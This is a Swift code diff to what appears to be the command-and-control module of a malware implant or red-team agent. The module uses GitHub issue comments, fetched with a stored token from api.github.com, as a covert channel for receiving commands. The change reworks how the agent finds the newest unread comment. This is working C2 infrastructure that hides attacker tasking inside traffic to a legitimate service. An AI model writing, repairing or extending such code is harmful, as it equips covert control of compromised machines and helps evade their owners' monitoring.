@@ -139,31 +139,38 @@ class GitHubProfile: C2Profile {
     private func readLatestIssueComment(issueNumber: Int) -> String {
         dispatch.enter()
         var result = ""
-        
-        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/issues/\(issueNumber)/comments?sort=created&direction=desc&per_page=1"
+
+        // GitHub API returns comments in ascending order (oldest first) by default
+        // We need to get all comments and find the latest one
+        // Using per_page=100 to get recent comments, then find the newest
+        let urlString = "https://api.github.com/repos/\(agentConfig.githubUsername)/\(agentConfig.githubRepo)/issues/\(issueNumber)/comments?per_page=100"
         guard let url = URL(string: urlString) else {
             dispatch.leave()
             return ""
         }
-        
+
         var request = URLRequest(url: url)
         request.httpMethod = "GET"
         request.setValue("token \(agentConfig.githubToken)", forHTTPHeaderField: "Authorization")
         request.setValue("application/vnd.github.v3+json", forHTTPHeaderField: "Accept")
         request.setValue(agentConfig.userAgent, forHTTPHeaderField: "User-Agent")
-        
+
         let task = URLSession(configuration: .ephemeral).dataTask(with: request) { data, response, error in
             if let data = data,
                let httpResponse = response as? HTTPURLResponse,
                httpResponse.statusCode == 200 {
-                if let json = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]],
-                   let firstComment = json.first,
-                   let commentId = firstComment["id"] as? Int,
-                   let body = firstComment["body"] as? String {
-                    // Only return the comment if it's newer than the last one we read
-                    if commentId > self.lastCommentId {
-                        self.lastCommentId = commentId
-                        result = body
+                if let json = try? JSONSerialization.jsonObject(with: data) as? [[String: Any]] {
+                    // Comments are returned in ascending order, so the last one is the newest
+                    // Find the newest comment that's newer than our lastCommentId
+                    for comment in json.reversed() {  // Iterate from newest to oldest
+                        if let commentId = comment["id"] as? Int,
+                           let body = comment["body"] as? String {
+                            if commentId > self.lastCommentId {
+                                self.lastCommentId = commentId
+                                result = body
+                                break  // Found the latest new comment, stop searching
+                            }
+                        }
                     }
                 }
             }
@@ -171,7 +178,7 @@ class GitHubProfile: C2Profile {
         }
         task.resume()
         dispatch.wait()
-        
+
         return result
     }
     
